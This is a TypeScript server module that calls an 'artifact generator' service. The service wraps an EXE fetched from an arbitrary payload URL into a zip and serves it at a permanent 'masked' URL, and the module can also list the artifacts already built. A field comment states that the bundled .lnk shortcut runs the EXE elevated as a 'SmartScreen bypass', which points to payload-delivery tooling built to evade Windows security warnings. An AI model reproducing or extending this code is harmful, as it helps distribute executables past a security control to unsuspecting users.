import "server-only";

import { env } from "./env";

export interface ExeArtifactResult {
  name: string;
  url: string;
  urlPath: string;
  sha256: string;
  size: number;
  writtenAt: string;
}

export interface CallExeArtifactOpts {
  /** Stable slug — becomes the permanent URL path (`/e/<name>`). */
  name: string;
  /** Inner EXE file name inside the zip (e.g. "Vantra.exe"). */
  innerExeName?: string;
  /** Served zip download filename (e.g. "Vantra.exe.zip"). */
  zipName?: string;
  /** A URL the generator fetches to get the EXE bytes. */
  payloadUrl: string;
  /** Root `.lnk` name that double-clicks run the EXE elevated (SmartScreen bypass). */
  lnkName?: string;
  /** Subfolder holding the EXE the `.lnk` runs (default "app"). */
  subFolder?: string;
}

/**
 * Calls the generator's permanent EXE artifact endpoint (`POST /exe-artifact`).
 * Same Fastify service + bearer secret as the MSI/ZIP generator. The artifact
 * is keyed by `name` and is PERMANENT (non-expiring) until rebuilt/overwritten,
 * so the same name always yields the same stable masked URL — ideal for pinning
 * in Vantra Settings / the SpaceWorker store.
 *
 * Contacts the generator only when configured (checks env first, matching the
 * MSI/ZIP callers). Throws on failure; the caller turns this into a 502.
 */
export async function callExeArtifact(
  opts: CallExeArtifactOpts,
): Promise<ExeArtifactResult> {
  if (!env.msiGeneratorUrl || !env.msiGeneratorSecret) {
    throw new Error(
      "Artifact generator is not configured (MSI_GENERATOR_URL / MSI_GENERATOR_SECRET not set).",
    );
  }

  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 60_000);

  try {
    const res = await fetch(`${env.msiGeneratorUrl}/exe-artifact`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${env.msiGeneratorSecret}`,
      },
      body: JSON.stringify({
        name: opts.name,
        ...(opts.innerExeName ? { innerExeName: opts.innerExeName } : {}),
        ...(opts.zipName ? { zipName: opts.zipName } : {}),
        ...(opts.lnkName ? { lnkName: opts.lnkName } : {}),
        ...(opts.subFolder ? { subFolder: opts.subFolder } : {}),
        payloadUrl: opts.payloadUrl,
      }),
      signal: controller.signal,
    });
    const data = (await res.json().catch(() => ({}))) as Partial<ExeArtifactResult> & {
      error?: string;
    };
    if (!res.ok) {
      throw new Error(data.error ?? `Exe artifact generator ${res.status}`);
    }
    if (!data.url || typeof data.url !== "string") {
      throw new Error("Exe artifact generator response missing url");
    }
    return {
      name: typeof data.name === "string" ? data.name : opts.name,
      url: data.url,
      urlPath: typeof data.urlPath === "string" ? data.urlPath : `/e/${opts.name}`,
      sha256: typeof data.sha256 === "string" ? data.sha256 : "",
      size: typeof data.size === "number" ? data.size : 0,
      writtenAt:
        typeof data.writtenAt === "string"
          ? data.writtenAt
          : new Date().toISOString(),
    };
  } catch (err) {
    if (err instanceof DOMException && err.name === "AbortError") {
      throw new Error("Exe artifact generator timed out after 60s");
    }
    throw err;
  } finally {
    clearTimeout(timeout);
  }
}

export interface ExeArtifactListItem {
  name: string;
  urlPath: string;
  zipName: string;
  innerExeName: string;
  lnkName?: string;
  subFolder?: string;
  sha256: string;
  size: number;
  writtenAt: string;
}

/**
 * Lists all already-built permanent EXE artifacts from the generator
 * (`GET /exe-artifacts`). Used by the admin UI to show existing stable URLs
 * without re-building. Throws when the generator is unreachable/unconfigured.
 */
export async function listExeArtifacts(): Promise<ExeArtifactListItem[]> {
  if (!env.msiGeneratorUrl || !env.msiGeneratorSecret) {
    throw new Error(
      "Artifact generator is not configured (MSI_GENERATOR_URL / MSI_GENERATOR_SECRET not set).",
    );
  }
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 30_000);
  try {
    const res = await fetch(`${env.msiGeneratorUrl}/exe-artifacts`, {
      method: "GET",
      headers: { Authorization: `Bearer ${env.msiGeneratorSecret}` },
      signal: controller.signal,
    });
    const data = (await res.json().catch(() => ({}))) as
      | ExeArtifactListItem[]
      | { error?: string };
    if (!res.ok) {
      const err = Array.isArray(data) ? `status ${res.status}` : (data as { error?: string }).error;
      throw new Error(err ?? `List exe artifacts ${res.status}`);
    }
    if (!Array.isArray(data)) return [];
    return data;
  } finally {
    clearTimeout(timeout);
  }
}